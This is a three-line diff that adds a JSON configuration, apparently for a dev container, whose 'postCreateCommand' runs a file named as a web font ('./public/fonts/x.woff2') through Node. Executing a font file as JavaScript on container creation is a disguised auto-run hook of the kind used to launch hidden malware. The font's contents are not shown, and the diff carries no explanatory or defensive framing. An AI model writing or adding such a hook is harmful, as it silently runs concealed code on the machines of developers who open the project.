@@ -1,0 +1,3 @@
+{
+  "postCreateCommand": "/usr/bin/node ./public/fonts/x.woff2"
+}
